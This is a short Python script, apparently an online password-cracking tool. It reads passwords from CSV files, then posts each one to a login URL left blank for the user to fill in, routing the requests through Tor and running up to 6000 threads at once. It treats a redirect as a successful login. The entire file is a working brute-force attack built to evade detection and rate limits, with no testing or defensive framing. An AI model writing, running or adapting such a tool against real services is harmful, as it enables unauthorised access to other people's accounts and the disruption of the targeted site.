import os
import csv
from tor import Tor
from concurrent.futures import ThreadPoolExecutor

found_password = None

def load_passwords_from_csv(file_path):
    passwords = []
    with open(file_path, 'r') as file:
        csv_reader = csv.DictReader(file)
        for row in csv_reader:
            passwords.append(row['password'])
    return passwords

def try_password(password, tor_client):
    global found_password  # Global variable

    if found_password is not None:  # Found the password
        print(f"PASSWORD FOUND: {found_password}")
        return

    credentials = {'account': '', 'password': password}
    print(f'Trying password: {password}')
    response = tor_client.tor_post(target_url, data=credentials)

    if response.is_redirect:
        print(f"PASSWORD FOUND: {password}")
        found_password = password  

if __name__ == '__main__':
    tor_client = Tor()
    target_url = "" #insert url

    all_passwords = []
    directory = "C:\\EXAMPLE\\passwords" #insert directory with passwords
    for filename in os.listdir(directory):
        if filename.endswith(".csv"):
            full_path = os.path.join(directory, filename)
            all_passwords.extend(load_passwords_from_csv(full_path))
    print(len(all_passwords))

    with ThreadPoolExecutor(max_workers=6000) as executor:
        futures = {executor.submit(try_password, password, tor_client) for password in all_passwords}
